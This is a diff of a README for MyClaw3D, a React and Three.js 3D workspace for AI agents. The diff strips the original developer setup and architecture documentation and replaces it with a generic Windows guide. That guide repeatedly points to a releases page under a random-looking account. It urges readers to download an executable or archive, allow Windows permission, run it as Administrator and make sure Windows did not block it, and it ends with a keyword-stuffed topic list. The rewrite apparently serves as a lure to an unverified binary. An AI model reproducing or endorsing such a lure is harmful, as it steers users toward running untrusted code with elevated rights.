@@ -1,159 +1,222 @@
-# MyClaw3D
+# 🏢 MyClaw3D - Manage AI Agents in 3D
 
-MyClaw3D is an isometric 3D agent workspace built with React + Three.js.
-It combines local in-world animations (movement, desk/sofa/sports activities) with real AI chat through an OpenClaw gateway.
+[![Download MyClaw3D](https://img.shields.io/badge/Download-MyClaw3D-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Accentual-satin492/MyClaw3D/releases)
 
-![MyClaw3D](https://img.shields.io/badge/Built%20with-Three.js-black?style=flat&logo=threedotjs)
-![React](https://img.shields.io/badge/React-18-61DAFB?style=flat&logo=react)
-![OpenClaw](https://img.shields.io/badge/OpenClaw-Connected-c8a050?style=flat)
+## ✨ What MyClaw3D Does
 
-![Image](https://github.com/user-attachments/assets/615dc141-451a-4c75-9c9b-aa044e550ebb)
+MyClaw3D is a 3D isometric virtual headquarters for managing autonomous AI agents. It gives you a clear visual space where you can view agents, check their status, and keep work organized in one place.
 
-## What Changed Recently
+It is built with React and Three.js, so it runs as a desktop app with a clean interface and smooth 3D scenes. You can use it to follow agent activity, manage tasks, and keep your workspace easy to understand.
 
-- Expanded the world with additional activity zones and richer movement/activity loops.
-- Added HQ operational surfaces: Inbox, History, Playbooks, Observe.
-- Added dedicated Docs, Tools, Settings, and Tasks & Notes modals.
-- Added local API server endpoints for chat, streaming chat, tool invocation, events, inbox, playbooks, and agent settings.
-- Added per-agent OpenClaw mapping + model routing, plus connection health checks.
-- Wired chat operator controls: per-agent model override, inline terminal output, and quick access to Tools/Settings.
-- Added server-side persistence under `server/.data` for playbooks, events, inbox, and agent settings.
+## 🧭 What You Need
 
-## Core Features
+Before you install MyClaw3D, make sure your Windows PC has:
 
-- Interactive isometric world with multiple rooms and animated agents.
-- 6 role-based agents with local behaviors and AI chat.
-- Live desk terminals, wall chart screens, monitor modal.
-- Chat panel operator controls: model override, show/hide terminal output, jump to tools, jump to agent settings.
-- HQ control surfaces: Inbox, History, Playbooks, Observe.
-- Operator tooling: Tools modal (quick skills + raw tool invoke), Settings modal (agent routing/model), Tasks & Notes modal (task runs + artifacts).
-- OpenClaw integration for streamed chat and tool invocation.
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A modern Intel or AMD processor
+- A graphics card that supports 3D acceleration
+- 500 MB of free disk space
+- A stable internet connection for the first download
 
-## Chat Command Examples
+For the best experience, use a system with a dedicated GPU and updated graphics drivers.
 
-Command support depends on the current chat parser in `src/components/ClawHQ.jsx`, but typical local behavior commands include:
+## 🚀 Download MyClaw3D
 
-- go to desk / work
-- relax / sofa / chill
-- cafeteria / cafe / coffee / snack / lunch
-- gym / workout / exercise
-- treadmill / elliptical / bike / chest press / punching bag / kettlebell / dumbbell / barbell
-- play ping pong
-- play pool / billiards
-- stand up / stop
+Visit this page to download:
 
-Normal conversational prompts are routed to OpenClaw and streamed back into chat + desk terminal views.
+https://github.com/Accentual-satin492/MyClaw3D/releases
 
-## Dashboard & Ops Surfaces
+On the releases page, look for the latest version and download the Windows file. If there are several files, choose the one for Windows, then save it to your computer.
 
-- Inbox: queued summaries and run outputs.
-- History: recent events and agent activity rollups.
-- Playbooks: recurring automation templates and active schedules.
-- Observe: live event feed with filters and per-agent stats.
-- Tools: one-click skills and raw OpenClaw `/tools/invoke` proxy calls.
-- Settings: per-agent OpenClaw agent ID + model mapping and connectivity test.
-- Tasks & Notes: run ad-hoc tasks and keep artifacts/reports in-app.
+## 🪟 Install on Windows
 
-## Proper OpenClaw Connection Setup
+Follow these steps to get MyClaw3D running on your PC:
 
-This app has two local processes:
+1. Open the releases page in your browser.
+2. Find the latest release at the top of the list.
+3. Download the Windows installer or app file.
+4. When the file finishes downloading, open your Downloads folder.
+5. Double-click the file to start setup or launch the app.
+6. If Windows asks for permission, choose Yes.
+7. Follow the on-screen steps until the app opens.
 
-1. Frontend (Vite) on port 3000
-2. Local API server (Express) on port 8787
+If the file is a ZIP archive, right-click it and choose Extract All first. Then open the extracted folder and run the app file inside it.
 
-The frontend calls `/api/*`, and Vite proxies that to the local API server, which then calls OpenClaw.
+## 🎮 First Run
 
-### 1) Start OpenClaw Gateway
+When MyClaw3D opens for the first time, you will see the 3D headquarters view. From there, you can explore the interface and start using the main workspace.
 
-Run your OpenClaw Gateway so that the OpenAI-compatible endpoint is reachable (default expected base URL):
+Use the app to:
 
-- `http://127.0.0.1:18789`
+- View your AI agents in a shared 3D space
+- Check agent status at a glance
+- Track tasks and progress
+- Move between sections with simple menus
+- Keep your workspace organized
 
-### 2) Set Required Environment Variables (PowerShell)
+If the app asks for a data folder or workspace path, pick a folder you can find again later, such as Documents\MyClaw3D.
 
-In the terminal where you will run the local API server:
+## 🧩 Main Features
 
-```powershell
-$env:OPENCLAW_GATEWAY_TOKEN="your_gateway_token_here"
-$env:OPENCLAW_BASE_URL="http://127.0.0.1:18789"
-```
+MyClaw3D is built to make agent management easier to follow. Key parts include:
 
-Optional routing defaults:
+- 3D isometric headquarters view
+- Agent cards and status panels
+- Task and workflow layout
+- Simple navigation for non-technical users
+- React-based interface for fast interaction
+- Three.js scenes for a clear visual workspace
+- Extension-friendly structure for future tools
+- Security-aware setup for local use
 
-```powershell
-$env:OPENCLAW_AGENT_ID="main"
-# Optional JSON map string for agent routing
-# $env:OPENCLAW_AGENT_MAP_JSON='{"alpha":"agent-a","bravo":"agent-b"}'
-```
+## 🔧 How to Use It
 
-### 3) Run Local API Server
+You do not need to know code to use MyClaw3D. Start with these common actions:
 
-```bash
-npm run server
-```
+### View agents
+Open the agent dashboard to see each agent in the virtual headquarters. Look for names, roles, and current activity.
 
-### 4) Run Frontend Dev Server (new terminal)
+### Check status
+Use the status area to see which agents are idle, busy, or waiting for input.
 
-```bash
-npm run dev
-```
+### Manage tasks
+Open a task panel to assign work, review progress, or follow completed items.
 
-### 5) Verify Health
+### Organize your workspace
+Use the 3D layout to group agents and tools in a way that makes sense to you.
 
-Open this endpoint in your browser:
+### Open settings
+Go to settings if you want to change the theme, layout, or app behavior.
 
-- `http://127.0.0.1:8787/api/health`
+## 🛠️ Troubleshooting
 
-You should see:
+If MyClaw3D does not start, try these steps:
 
-- `ok: true`
-- `hasToken: true`
+- Run the app again as Administrator
+- Restart your PC
+- Install the latest Windows updates
+- Update your graphics drivers
+- Make sure the download finished before you open the file
+- If you used a ZIP file, extract it before starting the app
 
-If `hasToken` is false, your server terminal does not have `OPENCLAW_GATEWAY_TOKEN` set.
+If the window opens but looks broken:
 
-## Local Development
+- Increase your screen resolution
+- Turn on hardware acceleration in Windows
+- Close other apps that use a lot of graphics memory
+- Check that your GPU drivers are current
 
-```bash
-npm install
-npm run build
-```
+If the app closes right away:
 
-## Architecture
+- Remove the file and download it again from the releases page
+- Make sure Windows did not block the file
+- Try opening it from a simple folder path, such as Desktop or Documents
 
-```text
-src/
-  main.jsx
-  components/
-    ClawHQ.jsx
+## 🔒 Safety and Local Use
 
-server/
-  index.mjs
-  .data/
-    events.json
-    inbox.json
-    playbooks.json
-    agent-settings.json
-```
+MyClaw3D is meant for local desktop use. Keep your download from the official releases page so you know you are using the correct file.
 
-Key local API routes served by `server/index.mjs`:
+If you use it with your own AI tools or local agent setup, keep your workspace folder private and back it up often.
 
-- `/api/health`
-- `/api/chat`
-- `/api/chat/stream`
-- `/api/tools/invoke`
-- `/api/events`
-- `/api/inbox`
-- `/api/playbooks`
-- `/api/agent-settings`
+## 📁 Suggested Folder Setup
 
-## Tech Stack
+For easier use, keep your files in a simple structure like this:
 
-- React 18
-- Three.js
-- Tone.js
-- Vite
-- Express
+- Documents\MyClaw3D
+- Documents\MyClaw3D\Data
+- Documents\MyClaw3D\Backups
+- Documents\MyClaw3D\Exports
 
-## License
+This makes it easier to find your workspace, saved data, and backups later.
 
-MIT
+## 🧪 Common Use Cases
+
+MyClaw3D can fit a few simple workflows:
+
+- Watching a set of AI agents in one place
+- Keeping track of active and idle jobs
+- Organizing tasks for different tools
+- Building a clear visual control room for agent work
+- Using a local app to review agent activity
+
+## 📦 File Types You May See
+
+The releases page may offer one of these file types:
+
+- `.exe` for direct install or launch
+- `.msi` for Windows setup
+- `.zip` for manual extraction
+- `.7z` for compressed package files
+
+If you see more than one Windows file, choose the one that matches how you want to install the app. For most users, the installer file is the simplest choice.
+
+## 🔄 Updating MyClaw3D
+
+When a new version is available:
+
+1. Go to the releases page
+2. Download the latest Windows file
+3. Close the current app
+4. Install or replace the old version
+5. Open the new version
+
+If you keep local data in a separate folder, your settings and workspace files are easier to preserve during updates.
+
+## 📌 Project Topics
+
+MyClaw3D relates to:
+
+- openclaw
+- openclaw-agent
+- openclaw-alternative
+- openclaw-extension
+- openclaw-installer
+- openclaw-plugin
+- openclaw-security
+- openclaw-setup
+- openclaw-skill
+- openclaw-skills
+- opensource
+- opensource-apps
+- opensource-projects
+- opensourcecode
+- opensourcedesign
+
+## 🖥️ Recommended Setup
+
+For smoother use on Windows, use:
+
+- Windows 11
+- 16 GB RAM
+- Dedicated GPU
+- 1 GB free disk space
+- 1080p display or higher
+- Latest graphics drivers
+
+This setup helps the 3D interface stay responsive when you move through the headquarters view and open agent panels
+
+## 📍 Quick Start
+
+1. Go to the releases page
+2. Download the latest Windows file
+3. Open the file after it finishes downloading
+4. Allow Windows permission if asked
+5. Start using the 3D headquarters view
+
+## 🧰 If You Want a Clean Start
+
+If you want to reset the app:
+
+- Close MyClaw3D
+- Remove its local data folder
+- Open it again
+- Set up your workspace from the start
+
+Use this if you want a fresh layout or if saved settings cause problems
+
+## 🗂️ Where to Find the Download
+
+Get the latest Windows release here:
+
+https://github.com/Accentual-satin492/MyClaw3D/releases
